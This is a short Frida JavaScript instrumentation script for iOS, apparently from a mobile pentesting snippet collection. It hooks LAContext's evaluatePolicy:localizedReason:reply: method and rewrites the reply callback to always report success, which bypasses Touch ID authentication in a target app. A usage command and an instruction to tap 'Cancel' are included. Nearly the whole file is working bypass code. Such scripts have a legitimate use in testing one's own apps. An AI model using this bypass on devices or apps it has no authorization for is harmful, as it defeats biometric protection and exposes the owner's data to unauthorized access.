/*
* raptor_frida_ios_*.js - Frida script snippets for iOS
* 
*
* Frida.re JS script snippets for iOS/ObjC instrumentation.
* See https: * for further information on this powerful tool.
*
* "We want to help others achieve interop through reverse
* engineering" -- @oleavr
*
* Useful snippet ripped from @henryhoggard's Needle module
* "hooking/frida/script_touch-id-bypass".
*
* Example usage:
* # frida -U -f com.xxx.yyy -l raptor_frida_ios.js --no-pause
* <IMPORTANT: afterwards tap "Cancel" in the Touch ID popup>
*/
if (ObjC.available) {
/*
* method to hook:
* - (void)evaluatePolicy:(LAPolicy)policy 
*        localizedReason:(NSString *)localizedReason 
*                  reply:(void (^)(BOOL success, NSError *error))reply;
*/
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
console.log("info: hooking Touch ID");
var block = new ObjC.Block(args[4]); 			var callback = block.implementation;
block.implementation = function(error, value) {
var reply = callback(1, null); 				return reply;
};
}
});
} else {
send("error: Objective-C Runtime is not available!");
}
